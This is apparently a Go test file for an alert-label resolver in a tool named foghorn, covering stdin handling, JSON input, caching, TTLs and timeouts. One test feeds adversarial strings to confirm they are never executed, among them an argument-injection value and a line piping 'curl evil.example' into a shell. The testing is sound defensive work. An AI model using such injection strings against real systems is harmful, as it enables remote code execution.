package resolve

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"reflect"
	"strconv"
	"strings"
	"testing"
	"time"

	"foghorn/internal/config"
	"foghorn/internal/model"
)

const resolverHelperEnv = "FOGHORN_RESOLVER_HELPER"

func TestResolveAlertLabelCommand(t *testing.T) {
	engine := New([]config.ResolverConfig{
		helperResolverConfig(t, "suffix", "value"),
	})

	alert := model.Alert{
		Name:   "TargetDown",
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	}

	resolved := engine.ResolveAlert(alert)
	if got := resolved.ResolvedLabels["cluster"]; got != "saas-cs-0b-resolved" {
		t.Fatalf("expected resolved cluster label, got %q", got)
	}
	if got := resolved.Labels["cluster"]; got != "saas-cs-0b" {
		t.Fatalf("expected raw cluster label to stay untouched, got %q", got)
	}
}

func TestResolveAlertEmptyStdinModeDefaultsToValue(t *testing.T) {
	cfg := helperResolverConfig(t, "suffix", "")
	engine := New([]config.ResolverConfig{cfg})

	resolved := engine.ResolveAlert(model.Alert{
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	})

	if got := resolved.ResolvedLabels["cluster"]; got != "saas-cs-0b-resolved" {
		t.Fatalf("expected empty programmatic stdin mode to use the raw value, got %q", got)
	}
}

func TestResolveAlertJSONInput(t *testing.T) {
	recordFile := filepath.Join(t.TempDir(), "resolver-input.json")
	cfg := helperResolverConfig(t, "record-json", "json", recordFile)
	cfg.Field = "field:source"
	engine := New([]config.ResolverConfig{cfg})

	startsAt := time.Date(2026, 8, 24, 10, 30, 0, 0, time.UTC)
	updatedAt := startsAt.Add(5 * time.Minute)
	alert := model.Alert{
		ID:           "alert-1",
		Source:       "prod-am",
		SourceType:   "alertmanager",
		Name:         "TargetDown",
		Severity:     "critical",
		State:        "firing",
		Labels:       map[string]string{"cluster": "saas-cs-0b", "job": "api"},
		Annotations:  map[string]string{"summary": "API is unavailable"},
		StartsAt:     startsAt,
		UpdatedAt:    updatedAt,
		GeneratorURL: "https://prometheus.example/graph",
		Receivers:    []string{"on-call"},
	}

	resolved := engine.ResolveAlert(alert)
	if got := resolved.ResolvedFields["source"]; got != "prod-am-resolved" {
		t.Fatalf("expected JSON resolver output, got %q", got)
	}

	payload, err := os.ReadFile(recordFile)
	if err != nil {
		t.Fatalf("reading recorded JSON input: %v", err)
	}
	var input resolverJSONInput
	if err := json.Unmarshal(payload, &input); err != nil {
		t.Fatalf("decoding recorded JSON input: %v", err)
	}
	if input.Version != 1 || input.Ref != "field:source" || input.Kind != "field" || input.Name != "source" || input.Value != "prod-am" {
		t.Fatalf("unexpected resolver input metadata: %#v", input)
	}
	if !reflect.DeepEqual(input.Alert, alert) {
		t.Fatalf("expected full alert metadata in JSON input\nwant: %#v\n got: %#v", alert, input.Alert)
	}
	if !reflect.DeepEqual(input.Labels, alert.Labels) {
		t.Fatalf("expected top-level labels alias, got %#v", input.Labels)
	}
	if !reflect.DeepEqual(input.Annotations, alert.Annotations) {
		t.Fatalf("expected top-level annotations alias, got %#v", input.Annotations)
	}
}

func TestResolveAlertDoesNotRenderProcessSpec(t *testing.T) {
	cfg := helperResolverConfig(t, "static-spec", "value", "{{.Value}}")
	cfg.Env["STATIC_VALUE"] = "{{.Value}}"
	engine := New([]config.ResolverConfig{cfg})

	resolved := engine.ResolveAlert(model.Alert{
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	})

	want := "arg={{.Value}} env={{.Value}} stdin=saas-cs-0b"
	if got := resolved.ResolvedLabels["cluster"]; got != want {
		t.Fatalf("expected command arguments and environment to remain static, got %q", got)
	}
}

func TestResolveAlertPassesAdversarialValuesOnlyThroughStdinAndKeysCacheByInput(t *testing.T) {
	recordFile := filepath.Join(t.TempDir(), "resolver-inputs")
	engine := New([]config.ResolverConfig{
		helperResolverConfig(t, "record-value", "value", recordFile),
	})

	inputs := []string{
		"-oProxyCommand=sh -c evil",
		"; curl evil.example | sh",
		`"'$(touch should-not-exist)'"`,
		"line one\nline two\x00tail",
	}
	for i, input := range inputs {
		resolved := engine.ResolveAlert(model.Alert{
			Labels: map[string]string{"cluster": input},
		})
		want := fmt.Sprintf("customer-%d", i+1)
		if got := resolved.ResolvedLabels["cluster"]; got != want {
			t.Fatalf("input %d: expected %q, got %q", i, want, got)
		}
	}

	cached := engine.ResolveAlert(model.Alert{
		Labels: map[string]string{"cluster": inputs[0]},
	})
	if got := cached.ResolvedLabels["cluster"]; got != "customer-1" {
		t.Fatalf("expected first input to keep its own cache entry, got %q", got)
	}

	recorded := readRecordedInputs(t, recordFile)
	if !reflect.DeepEqual(recorded, inputs) {
		t.Fatalf("resolver did not receive the exact stdin values\nwant: %#v\n got: %#v", inputs, recorded)
	}
}

func TestResolverCacheKeyHashesStdin(t *testing.T) {
	item := resolver{
		name: "cluster", command: "./resolve-cluster", args: []string{"--fixed"},
		env: map[string]string{"MODE": "fixed"}, stdin: "value",
	}
	env := []string{"MODE=fixed"}
	secret := []byte("remote-sensitive-value")

	first := resolverCacheKey(item, env, secret)
	second := resolverCacheKey(item, env, []byte("different-value"))
	if first == second {
		t.Fatal("different stdin payloads produced the same cache key")
	}
	if strings.Contains(first, string(secret)) {
		t.Fatal("cache key retained the raw stdin payload")
	}
}

func TestResolveAlertUsesCache(t *testing.T) {
	counterFile := filepath.Join(t.TempDir(), "resolver-count")
	engine := New([]config.ResolverConfig{
		helperResolverConfig(t, "count-success", "value", counterFile),
	})

	alert := model.Alert{
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	}

	first := engine.ResolveAlert(alert)
	second := engine.ResolveAlert(alert)

	if got := first.ResolvedLabels["cluster"]; got != "customer-1" {
		t.Fatalf("expected first resolved value customer-1, got %q", got)
	}
	if got := second.ResolvedLabels["cluster"]; got != "customer-1" {
		t.Fatalf("expected cached resolved value customer-1, got %q", got)
	}
	assertCounter(t, counterFile, 1)
}

func TestResolveAlertCacheTTLExpires(t *testing.T) {
	originalNow := timeNow
	t.Cleanup(func() {
		timeNow = originalNow
	})

	current := time.Date(2026, 3, 26, 12, 0, 0, 0, time.UTC)
	timeNow = func() time.Time { return current }

	counterFile := filepath.Join(t.TempDir(), "resolver-count")
	cfg := helperResolverConfig(t, "count-success", "value", counterFile)
	cfg.CacheTTL = time.Minute
	engine := New([]config.ResolverConfig{cfg})

	alert := model.Alert{
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	}

	first := engine.ResolveAlert(alert)
	current = current.Add(30 * time.Second)
	second := engine.ResolveAlert(alert)
	current = current.Add(61 * time.Second)
	third := engine.ResolveAlert(alert)

	if got := first.ResolvedLabels["cluster"]; got != "customer-1" {
		t.Fatalf("expected first resolved value customer-1, got %q", got)
	}
	if got := second.ResolvedLabels["cluster"]; got != "customer-1" {
		t.Fatalf("expected cached value before TTL expiry, got %q", got)
	}
	if got := third.ResolvedLabels["cluster"]; got != "customer-2" {
		t.Fatalf("expected refreshed value after TTL expiry, got %q", got)
	}
	assertCounter(t, counterFile, 2)
}

func TestResolveAlertCachesFailuresBriefly(t *testing.T) {
	originalNow := timeNow
	t.Cleanup(func() {
		timeNow = originalNow
	})

	current := time.Date(2026, 3, 26, 12, 0, 0, 0, time.UTC)
	timeNow = func() time.Time { return current }

	counterFile := filepath.Join(t.TempDir(), "resolver-count")
	engine := New([]config.ResolverConfig{
		helperResolverConfig(t, "count-failure", "value", counterFile),
	})

	alert := model.Alert{
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	}

	first := engine.ResolveAlert(alert)
	second := engine.ResolveAlert(alert)
	current = current.Add(defaultFailureCacheTTL + time.Second)
	third := engine.ResolveAlert(alert)

	if len(first.ResolvedLabels) != 0 {
		t.Fatalf("expected no resolved labels on first failure, got %#v", first.ResolvedLabels)
	}
	if len(second.ResolvedLabels) != 0 {
		t.Fatalf("expected no resolved labels on cached failure, got %#v", second.ResolvedLabels)
	}
	if len(third.ResolvedLabels) != 0 {
		t.Fatalf("expected no resolved labels after cache expiry, got %#v", third.ResolvedLabels)
	}
	assertCounter(t, counterFile, 2)
}

func TestResolveAlertUsesCacheWithStaticEnv(t *testing.T) {
	counterFile := filepath.Join(t.TempDir(), "resolver-count")
	cfg := helperResolverConfig(t, "env", "value", counterFile)
	cfg.Env["CACHE_A"] = "left"
	cfg.Env["CACHE_B"] = "right"
	engine := New([]config.ResolverConfig{cfg})

	alert := model.Alert{
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	}

	for i := 0; i < 25; i++ {
		resolved := engine.ResolveAlert(alert)
		if got := resolved.ResolvedLabels["cluster"]; got != "left/right/saas-cs-0b" {
			t.Fatalf("expected cached environment-backed value, got %q", got)
		}
	}
	assertCounter(t, counterFile, 1)
}

func TestResolveAlertHonorsTimeout(t *testing.T) {
	cfg := helperResolverConfig(t, "sleep", "value")
	cfg.Timeout = 50 * time.Millisecond
	engine := New([]config.ResolverConfig{cfg})

	started := time.Now()
	resolved := engine.ResolveAlert(model.Alert{
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	})

	if len(resolved.ResolvedLabels) != 0 {
		t.Fatalf("expected no resolved label after timeout, got %#v", resolved.ResolvedLabels)
	}
	if elapsed := time.Since(started); elapsed > 2*time.Second {
		t.Fatalf("resolver timeout took too long: %v", elapsed)
	}
}

func TestResolveAlertRejectsUnknownStdinModeWithoutExecution(t *testing.T) {
	recordFile := filepath.Join(t.TempDir(), "should-not-exist")
	engine := New([]config.ResolverConfig{
		helperResolverConfig(t, "record-value", "unsupported", recordFile),
	})

	resolved := engine.ResolveAlert(model.Alert{
		Labels: map[string]string{"cluster": "saas-cs-0b"},
	})

	if len(resolved.ResolvedLabels) != 0 {
		t.Fatalf("expected no resolved label for an unknown stdin mode, got %#v", resolved.ResolvedLabels)
	}
	if _, err := os.Stat(recordFile); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("resolver process ran for an unknown stdin mode: %v", err)
	}
}

func helperResolverConfig(t *testing.T, operation, stdin string, args ...string) config.ResolverConfig {
	t.Helper()

	executable, err := os.Executable()
	if err != nil {
		t.Fatalf("finding test executable: %v", err)
	}
	helperArgs := []string{"-test.run=^TestResolverHelperProcess$", "--", operation}
	helperArgs = append(helperArgs, args...)
	return config.ResolverConfig{
		Name:    "cluster",
		Field:   "label:cluster",
		Command: executable,
		Args:    helperArgs,
		Env:     map[string]string{resolverHelperEnv: "1"},
		Stdin:   stdin,
		Timeout: 10 * time.Second,
	}
}

func assertCounter(t *testing.T, path string, want int) {
	t.Helper()

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("reading counter file: %v", err)
	}
	got, err := strconv.Atoi(string(data))
	if err != nil {
		t.Fatalf("parsing counter file %q: %v", string(data), err)
	}
	if got != want {
		t.Fatalf("expected resolver command to run %d times, got %d", want, got)
	}
}

func readRecordedInputs(t *testing.T, path string) []string {
	t.Helper()

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("reading recorded inputs: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	inputs := make([]string, 0, len(lines))
	for _, line := range lines {
		input, err := strconv.Unquote(line)
		if err != nil {
			t.Fatalf("decoding recorded input %q: %v", line, err)
		}
		inputs = append(inputs, input)
	}
	return inputs
}

func TestResolverHelperProcess(t *testing.T) {
	if os.Getenv(resolverHelperEnv) != "1" {
		return
	}

	args := helperProcessArgs(t)
	if len(args) == 0 {
		t.Fatal("missing resolver helper operation")
	}
	input, err := io.ReadAll(os.Stdin)
	if err != nil {
		t.Fatalf("reading resolver stdin: %v", err)
	}

	switch args[0] {
	case "suffix":
		fmt.Printf("%s-resolved\n", input)
	case "record-json":
		requireHelperArgs(t, args, 2)
		var payload resolverJSONInput
		if err := json.Unmarshal(input, &payload); err != nil {
			t.Fatalf("decoding resolver JSON: %v", err)
		}
		if err := os.WriteFile(args[1], input, 0o600); err != nil {
			t.Fatalf("recording resolver JSON: %v", err)
		}
		fmt.Printf("%s-resolved\n", payload.Value)
	case "static-spec":
		requireHelperArgs(t, args, 2)
		fmt.Printf("arg=%s env=%s stdin=%s\n", args[1], os.Getenv("STATIC_VALUE"), input)
	case "record-value":
		requireHelperArgs(t, args, 2)
		count := appendRecordedInput(t, args[1], string(input))
		fmt.Printf("customer-%d\n", count)
	case "count-success":
		requireHelperArgs(t, args, 2)
		count := incrementCounter(t, args[1])
		fmt.Printf("customer-%d\n", count)
	case "count-failure":
		requireHelperArgs(t, args, 2)
		incrementCounter(t, args[1])
		os.Exit(1)
	case "env":
		requireHelperArgs(t, args, 2)
		incrementCounter(t, args[1])
		fmt.Printf("%s/%s/%s\n", os.Getenv("CACHE_A"), os.Getenv("CACHE_B"), input)
	case "sleep":
		time.Sleep(5 * time.Second)
		fmt.Println("too-late")
	default:
		t.Fatalf("unknown resolver helper operation %q", args[0])
	}
}

func helperProcessArgs(t *testing.T) []string {
	t.Helper()

	for i, arg := range os.Args {
		if arg == "--" {
			return os.Args[i+1:]
		}
	}
	return nil
}

func requireHelperArgs(t *testing.T, args []string, count int) {
	t.Helper()
	if len(args) < count {
		t.Fatalf("resolver helper expected %d arguments, got %d", count, len(args))
	}
}

func incrementCounter(t *testing.T, path string) int {
	t.Helper()

	count := 0
	data, err := os.ReadFile(path)
	if err == nil {
		count, err = strconv.Atoi(string(data))
		if err != nil {
			t.Fatalf("parsing counter file: %v", err)
		}
	} else if !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("reading counter file: %v", err)
	}
	count++
	if err := os.WriteFile(path, []byte(strconv.Itoa(count)), 0o600); err != nil {
		t.Fatalf("writing counter file: %v", err)
	}
	return count
}

func appendRecordedInput(t *testing.T, path, input string) int {
	t.Helper()

	existing, err := os.ReadFile(path)
	if err != nil && !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("reading recorded inputs: %v", err)
	}
	count := 1
	if len(existing) > 0 {
		count += strings.Count(string(existing), "\n")
	}
	file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600)
	if err != nil {
		t.Fatalf("opening recorded inputs: %v", err)
	}
	if _, err := fmt.Fprintln(file, strconv.Quote(input)); err != nil {
		_ = file.Close()
		t.Fatalf("recording resolver input: %v", err)
	}
	if err := file.Close(); err != nil {
		t.Fatalf("closing recorded inputs: %v", err)
	}
	return count
}
